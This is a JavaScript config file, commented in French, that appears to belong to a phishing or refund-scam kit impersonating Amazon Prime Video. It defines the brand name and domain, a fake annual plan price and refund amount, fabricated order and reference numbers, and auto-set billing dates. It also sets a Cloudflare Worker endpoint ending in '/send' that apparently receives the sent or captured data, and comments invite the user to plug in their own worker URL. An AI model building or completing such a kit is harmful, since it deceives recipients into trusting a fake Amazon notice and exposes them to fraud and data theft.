export const CONFIG = {
  serviceName: 'Prime',
  domain: 'primevideo.com',
  planName: 'Prime Annuel',
  price: 69.9,
  refundAmount: 69.0,
  currency: '€',
  // Modifie ces dates comme tu veux :
  billingDate: new Date().toLocaleDateString('fr-FR'),
  renewalDate: new Date(new Date().setFullYear(new Date().getFullYear() + 1)).toLocaleDateString('fr-FR'),
  prelevementDate: new Date().toLocaleDateString('fr-FR'),
  orderNumber: 'D01-6526138-8680638',
  reference: 'FR-8123456-7890',
  refundDelay: '5 à 10 jours ouvrables',
  // Prix déjà formatés à la française :
  priceStr: '69,90',
  refundAmountStr: '69,90',
  // Worker Cloudflare (remplace par ton URL workers.dev)
  workerUrl: 'https://springfield-moove2.laurie-q51c.workers.dev/send',
}